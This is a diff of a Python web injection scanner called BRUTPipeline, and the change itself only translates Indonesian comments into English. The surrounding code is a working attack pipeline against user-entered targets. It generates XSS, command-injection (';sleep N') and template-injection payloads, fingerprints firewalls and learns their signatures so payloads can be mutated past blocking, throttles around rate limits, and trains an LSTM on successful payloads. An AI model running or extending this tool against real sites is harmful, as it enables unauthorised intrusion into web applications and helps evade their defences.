@@ -5395,14 +5395,14 @@ class SecondOrderConfirmer:
             ]
             return random.choice(variants)
         elif category == "xss":
-            # Untuk XSS, coba refleksi sederhana
+            # For XSS, try a simple reflection payload.
             return f"<script>alert('XSS-{random.randint(1000,9999)}')</script>"
         elif category == "cmdi":
             return f";sleep {random.randint(3,7)}"
         elif category == "ssti":
             return f"{{{{ {random.randint(100,999)} * {random.randint(100,999)} }}}}"
         else:
-            # Default: tambahkan null byte atau encoding
+            # Otherwise, append a null byte or encoding.
             return original_payload + "%00"
             
     def verify(self, injector: Injector, param: Parameter, original_result: InjectionResult) -> Tuple[bool, str]:
@@ -5410,12 +5410,12 @@ class SecondOrderConfirmer:
         Kirim payload verifikasi dan bandingkan waktu respons.
         Returns: (is_confirmed, evidence)
         """
-        # Buat payload verifikasi
+        # Create the verification payload.
         verif_payload = self.generate_verification_payload(
             original_result.payload, original_result.category
         )
         
-        # Simulasikan payload dict dengan payload verifikasi
+        # Build a payload dictionary for verification.
         verif_payload_dict = {
             "id": f"VERIFY-{uuid.uuid4().hex[:8]}",
             "payload": verif_payload,
@@ -5424,7 +5424,7 @@ class SecondOrderConfirmer:
             "mutation_history": ["verification"],
         }
         
-        # Kirim request pertama (baseline) tanpa payload verifikasi (atau dengan payload netral)
+        # Send a baseline request without the verification payload.
         baseline_payload = "1"  # payload netral
         baseline_dict = {
             "id": "BASELINE",
@@ -5452,7 +5452,7 @@ class SecondOrderConfirmer:
         # Bandingkan waktu
         time_diff = avg_time - baseline_time
         if time_diff > self.time_threshold:
-            # Sukses: ada perbedaan waktu signifikan
+            # Confirmed: the timing difference is significant.
             evidence = f"Time-based confirmation: +{time_diff:.2f}s (threshold: {self.time_threshold}s)"
             self.confirmed_vulnerabilities.append({
                 "parameter": param.name,
@@ -5470,7 +5470,7 @@ class SecondOrderConfirmer:
 # MAIN PIPELINE v6.0.1
 # ============================================================
 class BRUTPipeline:
-    """Mengorkestrasi discovery, pembuatan payload, injection, dan pelaporan."""
+    """Orchestrate discovery, payload generation, injection, and reporting."""
     def __init__(self, target, proxy_file: str = None):
         self.target = target
         self.parameters: List[Parameter] = []
@@ -5556,13 +5556,13 @@ class BRUTPipeline:
         self.logger = DetailedLogger()
 
     def phase1_discover(self):
-        """Menemukan parameter dan endpoint yang berada dalam scope target."""
+        """Discover parameters and endpoints within the target scope."""
         discovery = ParameterDiscovery(self.target)
         self.parameters = discovery.run()
         return self.parameters
 
     def phase2_generate(self, count):
-        """Membuat sejumlah payload tervalidasi dan menginisialisasi populasinya."""
+        """Create validated payloads and initialize the evolution population."""
         if count <= 0: return []
         self.payloads = self.generator.generate(count)
         self.evolver.initialize_population(self.payloads)
@@ -5572,7 +5572,7 @@ class BRUTPipeline:
         return self.payloads
 
     def phase3_inject(self, max_mode=False):
-        """Menguji kombinasi payload-parameter dengan kontrol adaptif dan retry."""
+        """Test payload-parameter combinations with adaptive controls and retries."""
         self.results = []
         total = len(self.payloads) * len(self.parameters)
         tested = 0
@@ -5592,7 +5592,7 @@ class BRUTPipeline:
               f"Backoff: auto")
         print(f"\033[33m{'─'*100}\033[0m")
         
-        # v7.0 FIX C5: Reset WAF state di awal setiap phase3
+        # v7.0 FIX C5: Reset WAF state at the start of each phase3 run.
         self.schema.waf_type = "Unknown"
         self.schema.waf_confidence = 0.0
         self.schema.waf_history = []
@@ -5613,7 +5613,7 @@ class BRUTPipeline:
         try:
             async_endpoints = self.async_scanner.scan()
             if async_endpoints:
-                # Deduplikasi dengan hasil sync scanner
+                # Deduplicate against synchronous scanner results.
                 existing_urls = {ep["url"] for ep in self.discovered_endpoints}
                 new_async = [ep for ep in async_endpoints if ep["url"] not in existing_urls]
                 if new_async:
@@ -5632,12 +5632,12 @@ class BRUTPipeline:
 
         for param in self.parameters:
             if max_mode and found_success: break
-            # v7.0 (Batch 3): Check cancel event setiap ganti parameter
+            # v7.0 (Batch 3): Check the cancel event before each parameter.
             if CANCEL_EVENT.is_set():
                 print(f"\n  \033[1;31m[✗ CANCELLED]\033[0m Proses dibatalkan oleh user.")
                 break
             for payload_dict in self.payloads:
-                # v7.0 (Batch 3): Check cancel event setiap payload
+                # v7.0 (Batch 3): Check the cancel event before each payload.
                 if CANCEL_EVENT.is_set():
                     print(f"\n  \033[1;31m[✗ CANCELLED]\033[0m Proses dibatalkan oleh user.")
                     break
@@ -5650,14 +5650,14 @@ class BRUTPipeline:
                     self.learner.record_feedback(payload_dict, result)
                     
                     # v7.0 FIX C2+C5: Sinkronisasi WAF source
-                    # FeedbackLearner._detect_waf() sudah mengisi learner.waf_type
-                    # Sekarang sinkronkan ke schema agar Bandit & mutate() bisa pakai
+                    # FeedbackLearner._detect_waf() has populated learner.waf_type.
+                    # Synchronize it with the schema for bandit and mutation use.
                     if self.learner.waf_detected and self.learner.waf_type:
                         old_waf = self.schema.waf_type
                         self.schema.waf_type = self.learner.waf_type
                         self.schema.waf_confidence = 0.9
                         
-                        # Konfirmasi tambahan via WAFFingerprinter (rule-based body analysis)
+                        # Add confirmation through WAFFingerprinter body analysis.
                         try:
                             fp_response = {
                                 "headers": {},
@@ -5671,7 +5671,7 @@ class BRUTPipeline:
                         except Exception:
                             pass
                         
-                        # Log jika WAF berubah
+                        # Log WAF changes.
                         if old_waf != self.schema.waf_type:
                             print(f"  \033[1;35m[WAF-SYNC]\033[0m WAF updated: "
                                   f"'{old_waf}' → '{self.schema.waf_type}' "
@@ -5690,8 +5690,8 @@ class BRUTPipeline:
                         was_blocked=(result.response_type == "blocked")
                     )
                     
-                    # v7.0 NEW: Differential WAF Learning — infer signature tiap 25 payload
-                    # Hanya berjalan jika sudah ada cukup data blocked
+                    # v7.0 NEW: Differential WAF Learning — infer signatures every 25 payloads.
+                    # Run only after enough blocked data has been collected.
                     if (tested % 25 == 0 and 
                             len(self.waf_inference.blocked_payloads) >= self.waf_inference.min_occurrences):
                         inferred = self.waf_inference.infer_signatures()
@@ -5702,7 +5702,7 @@ class BRUTPipeline:
                     
                     # === v6.1 NEW: Granular Reward & Backoff ===
                     
-                    # 1. Hitung reward granular berdasarkan respons
+                    # 1. Calculate a granular reward from the response.
                     # === v7.0 FIX C3: Baseline Response Management ===
                     param_key = f"{param.name}:{param.url}"
                     if param_key not in self.baseline_responses:
@@ -5736,7 +5736,7 @@ class BRUTPipeline:
                     
                     # === v6.1 NEW + v7.0: Granular Reward & Backoff ===
                     
-                    # 1. Hitung reward granular berdasarkan respons (dengan baseline)
+                    # 1. Calculate a granular reward from the response and baseline.
                     granular_reward = self.reward_engine.calculate_reward(
                         response={
                             "status_code": result.status_code,
@@ -5752,12 +5752,12 @@ class BRUTPipeline:
                         baseline_headers=baseline.get("headers", {})
                     )
                     
-                    # v7.0 (Batch 6): Boost reward jika statistical anomaly terdeteksi
+                    # v7.0 (Batch 6): Boost the reward when a statistical anomaly is detected.
                     if stat_anomaly > 0.4:
                         granular_reward += 0.3 * stat_anomaly
                         granular_reward = min(1.0, granular_reward)                  
                     
-                    # 2. Update bandit dengan reward yang dihitung
+                    # 2. Update the bandit with the calculated reward.
                     muts = payload_dict.get("mutation_history", [])
                     waf_type = getattr(self.schema, 'waf_type', '') or ''
                     for mut in muts:
@@ -5771,7 +5771,7 @@ class BRUTPipeline:
                         self.schema.clusterer.blacklist_cluster(payload)
                         
                         # v6.1 FINAL: Juga blacklist payload serupa di populasi
-                        # agar tidak membuang waktu menguji varian yang sama
+                        # Avoid spending time testing the same variant.
                         blacklisted_count = 0
                         remaining_pop = []
                         for cand in self.evolver.population:
@@ -5786,11 +5786,11 @@ class BRUTPipeline:
                             print(f"    \033[33m[CLUSTER]\033[0m Removed {blacklisted_count} "
                                   f"similar payloads from population")
                     
-                    # v6.1 FINAL: Juga blacklist pada filtered (bukan hanya blocked)
+                    # v6.1 FINAL: Also blacklist filtered results, not only blocked results.
                     elif result.response_type == "filtered" and result.status_code in [403, 406]:
                         self.schema.clusterer.blacklist_cluster(payload)
                     
-                    # 4. Backoff otomatis jika terkena 429
+                    # 4. Apply automatic backoff after a 429 response.
                     if result.status_code == 429:
                         should_backoff, backoff_time = self.reward_engine.should_backoff(
                             result.status_code, {}
@@ -5801,14 +5801,14 @@ class BRUTPipeline:
                             time.sleep(backoff_time)
                             self.throttler.record_rate_limited(429)
                     
-                    # 5. Progressive penalty: tambah delay jika 403/429
+                    # 5. Apply a progressive delay penalty for 403/429 responses.
                     if result.status_code in [403, 429]:
                         self.schema.rate_limit_events.append({
                             "status": result.status_code,
                             "timestamp": time.time(),
                             "payload_hash": payload_dict.get("hash", "")
                         })
-                        # Jika 3+ rate limit dalam 60 detik, tambah delay ekstra
+                        # Add extra delay after three or more rate limits in 60 seconds.
                         recent_events = [
                             e for e in self.schema.rate_limit_events
                             if time.time() - e["timestamp"] < 60
@@ -5845,18 +5845,18 @@ class BRUTPipeline:
                     self.logger.log_result(tested, total, result)
                     # === v6.2: Second-Order Confirmation ===
                     if self.confirmer.should_verify(result):
-                        # Hanya verifikasi jika ada indikasi
+                        # Verify only when there is supporting evidence.
                         is_confirmed, evidence = self.confirmer.verify(
                             self.injector, param, result
                         )
                         if is_confirmed:
-                            # Tandai result sebagai terkonfirmasi
+                            # Mark the result as confirmed.
                             result.success = True
                             result.response_type = "server_output"
                             result.evidence = f"[CONFIRMED] {evidence}"
                             print(f"  \033[1;32m[✓ CONFIRMED]\033[0m {result.parameter} → {evidence}")
                         else:
-                            # Jika tidak terkonfirmasi, turunkan skor atau tandai
+                            # Lower the score or mark it when confirmation fails.
                             print(f"  \033[33m[? UNCONFIRMED]\033[0m {result.parameter} → {evidence}")
 
                     if result.status_code == 429:
@@ -5885,7 +5885,7 @@ class BRUTPipeline:
                 if tested % 100 == 0 and tested > 0:
                     new_pop = self.evolver.evolve_generation()
                     
-                    # v7.0 NEW: Suntikkan payload diversifikasi setiap evolusi
+                    # v7.0 NEW: Inject diversified payloads during each evolution.
                     diversity_batch = self.diversity_engine.diversify_batch(new_pop, count=5)
                     if diversity_batch:
                         new_pop.extend(diversity_batch)
@@ -5905,12 +5905,12 @@ class BRUTPipeline:
 
         # === v6.1 NEW: Post-Attack ML Training ===
         
-        # Train LSTM pada payload yang berhasil (server_output)
+        # Train the LSTM on successful payloads (server_output).
         server_results = [r for r in self.results if r.response_type == "server_output"]
         if server_results and len(server_results) >= 3:
             success_payloads = [r.payload for r in server_results]
             try:
-                # v6.1 NEW: Buat dan latih LSTM
+                # v6.1 NEW: Create and train the LSTM.
                 self.lstm_generator = CharLevelLSTMGenerator(hidden_size=128, num_layers=2, seq_length=20)
                 self.lstm_generator.train(success_payloads, epochs=50, lr=0.005)
                 print(f"  \033[1;36m[LSTM]\033[0m Trained on {len(success_payloads)} "
@@ -5926,7 +5926,7 @@ class BRUTPipeline:
             except Exception as e:
                 print(f"  \033[33m[LSTM]\033[0m Training/Generation skipped: {e}")
 
-        # Fit semantic clusterer pada semua payload yang diuji
+        # Fit the semantic clusterer on all tested payloads.
         all_payloads_str = [r.payload for r in self.results if r.payload]
         if len(all_payloads_str) >= 5:
             try:
@@ -5947,7 +5947,7 @@ class BRUTPipeline:
                 unique_labels = set(response_labels)
                 print(f"  \033[1;36m[KMEANS]\033[0m Clustered {len(all_bodies)} responses "
                       f"into {len(unique_labels)} groups")
-                # Simpan label untuk analisis
+                # Store labels for analysis.
                 self.anomaly_detector.labels_history = response_labels
                 self.anomaly_detector.response_bodies = all_bodies
         except Exception:
@@ -5977,19 +5977,19 @@ class BRUTPipeline:
         if total_payloads == 0:
             return {"status": "no_results"}
         
-        # Hitung distribusi response type
+        # Calculate response-type distribution.
         response_dist = {}
         for r in self.results:
             rt = r.response_type or "unknown"
             response_dist[rt] = response_dist.get(rt, 0) + 1
         
-        # Hitung distribusi status code
+        # Calculate status-code distribution.
         status_dist = {}
         for r in self.results:
             sc = r.status_code or 0
             status_dist[str(sc)] = status_dist.get(str(sc), 0) + 1
         
-        # Hitung metrik kunci
+        # Calculate key metrics.
         successful = response_dist.get("server_output", 0)
         blocked = response_dist.get("blocked", 0)
         filtered = response_dist.get("filtered", 0)
@@ -6122,7 +6122,7 @@ class BRUTPipeline:
         return self.results
 
     def phase3_advanced_retry(self):
-        """Menguji varian lanjutan dari hasil blocked atau respons biasa."""
+        """Test advanced variants derived from blocked or normal responses."""
         failed = [r for r in self.results if r.response_type in ["raw_html", "blocked"]]
         if not failed: return []
 
@@ -6151,14 +6151,14 @@ class BRUTPipeline:
         return adv_results
 
     def phase4_save(self, confirmer=None):
-        """Menyimpan seluruh hasil pipeline dan metadata analisis ke disk."""
+        """Save all pipeline results and analysis metadata to disk."""
         return self.saver.save(self.results, self.payloads,
                               self.learner, self.schema, self.evolver,
                               self.proxy_manager, self.throttler,
                               confirmer=confirmer or self.confirmer)
 
     def print_summary(self):
-        """Menampilkan ringkasan hasil, pembelajaran, proxy, dan throttling."""
+        """Display a summary of results, learning, proxies, and throttling."""
         server = [r for r in self.results if r.response_type == "server_output"]
         raw = [r for r in self.results if r.response_type == "raw_html"]
         blocked = [r for r in self.results if r.response_type == "blocked"]
@@ -6208,27 +6208,27 @@ class BRUTPipeline:
 # INTERACTIVE MAIN LOOP v6.0.1
 # ============================================================
 def interactive_main():
-    """Menjalankan lobby interaktif untuk memilih target dan mengendalikan pipeline."""
-    # v7.0 NEW: Inisialisasi database (auto-create jika belum ada)
+    """Run the interactive lobby for selecting targets and controlling the pipeline."""
+    # v7.0 NEW: Initialize the database and create it when absent.
     global DB
     DB = init_database()
 
-    # Pesan tertunda yang akan ditampilkan di lobby berikutnya
+    # Deferred message displayed in the next lobby iteration.
     lobby_message = ""
 
     while True:
-        # Bersihkan layar & cetak ulang banner setiap iterasi
-        # → menghapus bekas box/input lama saat perintah salah
+        # Clear the screen and redraw the banner on every iteration.
+        # This removes stale input boxes after invalid commands.
         clear_screen()
         print_banner()
 
-        # Tampilkan pesan tertunda (error/status) jika ada
+        # Display a deferred error or status message when present.
         if lobby_message:
             print(f"  {lobby_message}")
             lobby_message = ""
 
         db_count = DB.count()
-        # Baris placeholder untuk animasi welcome (di atas box)
+        # Placeholder line for the welcome animation above the input box.
         print()
         print(" ")
         print(f"\033[1;33m{'─'*60}\033[0m")
@@ -6252,7 +6252,7 @@ def interactive_main():
             print(f"\n\n\033[31m[*]\033[0m Exiting...")
             break
 
-        # Hentikan animasi welcome begitu user menekan Enter
+        # Stop the welcome animation when the user presses Enter.
         stop_welcome_animation(anim_thread)
 
         if not target: continue
@@ -6265,13 +6265,13 @@ def interactive_main():
             lobby_message = f"\033[1;31m[!] Perintah tidak dikenal: {target}\033[0m"
             continue
 
-        # === /save <target> — simpan target ke database ===
+        # === /save <target> — save a target to the database ===
         if target.lower().startswith("/save "):
             save_url = target[6:].strip()
             if not save_url:
                 lobby_message = "\033[1;31m[!] Usage: /save <link/ip/domain/url>\033[0m"
                 continue
-            # Normalisasi
+            # Normalize the target URL.
             if not save_url.startswith(("http://", "https://")):
                 save_url = "http://" + save_url
             parsed_save = urlparse(save_url)
@@ -6282,7 +6282,7 @@ def interactive_main():
             lobby_message = f"\033[1;32m[✓] Target tersimpan dengan ID {new_id}: {save_url}\033[0m"
             continue
 
-        # === /viewdb — tampilkan isi database ===
+        # === /viewdb — display the database contents ===
         if target.lower() == "/viewdb":
             stop_welcome_animation(anim_thread)
             targets = DB.get_all_targets()
@@ -6302,7 +6302,7 @@ def interactive_main():
             print(f"\033[1;33m{'─'*60}\033[0m")
             print(f"  \033[90mKetik \033[1;37m/load <id>\033[0m \033[90muntuk memuat target, atau \033[1;37m/back\033[0m \033[90muntuk kembali\033[0m")
             print(f"\033[1;33m{'═'*60}\033[0m")
-            # Tunggu user menekan Enter atau /back
+            # Wait for Enter or /back.
             while True:
                 try:
                     sub_cmd = input(f"\n  \033[1;36mDB\033[0m \033[33m>>\033[0m ").strip()
@@ -6326,11 +6326,11 @@ def interactive_main():
                 else:
                     print(f"  \033[90mPerintah tidak dikenal. Ketik /back untuk kembali.\033[0m")
             if target.lower().startswith("/load "):
-                # target sudah di-set di dalam sub-loop
+                # The target was set inside the sub-loop.
                 pass
             elif target == "/viewdb":
                 continue
-        # === /load <id> — muat target dari database langsung dari lobby ===
+        # === /load <id> — load a target from the database ===
         if target.lower().startswith("/load "):
             try:
                 load_id = int(target.split()[1])
@@ -6344,12 +6344,12 @@ def interactive_main():
             lobby_message = f"\033[1;32m[✓] Target dimuat dari DB (ID {load_id}): {loaded_target}\033[0m"
             target = loaded_target
             LOADED_TARGET_ID = load_id
-            # Jangan continue — biarkan jatuh ke proses pipeline di bawah
+            # Do not continue; let execution fall through to the pipeline below.
 
-        # === /back — konfirmasi keluar dari lobby ===
+        # === /back — confirm leaving the lobby ===
         if target.lower() == "/back":
-            # Saat progress blocking, /back tidak bisa diketik (main thread sibuk)
-            # Di lobby normal: konfirmasi keluar
+            # During blocking progress, /back cannot be entered because the main thread is busy.
+            # In the normal lobby, it asks for exit confirmation.
             try:
                 confirm_back = input(f"  \033[1;33m[?] Kembali ke awal (keluar)? [y/N] >> \033[0m").strip().lower()
             except (EOFError, KeyboardInterrupt):
@@ -6362,14 +6362,14 @@ def interactive_main():
                 continue
                 
 
-        # === /cancel — batalkan target yang di-load (sebelum progress) ===
+        # === /cancel — cancel a loaded target before progress starts ===
         if target.lower() == "/cancel":
-            # Saat progress blocking, /cancel tidak bisa diketik (main thread sibuk)
-            # Jadi handler ini hanya untuk membatalkan loaded target di lobby
+            # During blocking progress, /cancel cannot be entered because the main thread is busy.
+            # This handler therefore cancels only a loaded target in the lobby.
             if LOADED_TARGET_ID is None:
                 lobby_message = "\033[1;33m[!] Tidak ada yang perlu dibatalkan.\033[0m"
                 continue
-            # Konfirmasi y/n
+            # Request y/n confirmation.
             try:
                 confirm_cancel = input(f"  \033[1;31m[⚠] Apakah anda yakin? [y/N] >> \033[0m").strip().lower()
             except (EOFError, KeyboardInterrupt):
@@ -6404,8 +6404,8 @@ def interactive_main():
             lobby_message = f"\033[1;31m[!] Target tidak valid: {target}\033[0m"
             continue
 
-        # v7.0 (Batch 4): Pipeline blocking — input bar hilang saat progress
-        # Ctrl+C membatalkan proses dan kembali ke lobby (bukan keluar script)
+        # v7.0 (Batch 4): Blocking pipeline; the input bar is hidden during progress.
+        # Ctrl+C cancels the process and returns to the lobby instead of exiting.
         CANCEL_EVENT.clear()
         PROGRESS_ACTIVE = True
         try:
@@ -6504,7 +6504,7 @@ def interactive_main():
             LOADED_TARGET_ID = None
 
         except KeyboardInterrupt:
-            # Ctrl+C saat progress → batalkan dan kembali ke lobby (BUKAN keluar script)
+            # Ctrl+C during progress cancels the run and returns to the lobby.
             CANCEL_EVENT.set()
             PROGRESS_ACTIVE = False
             LOADED_TARGET_ID = None
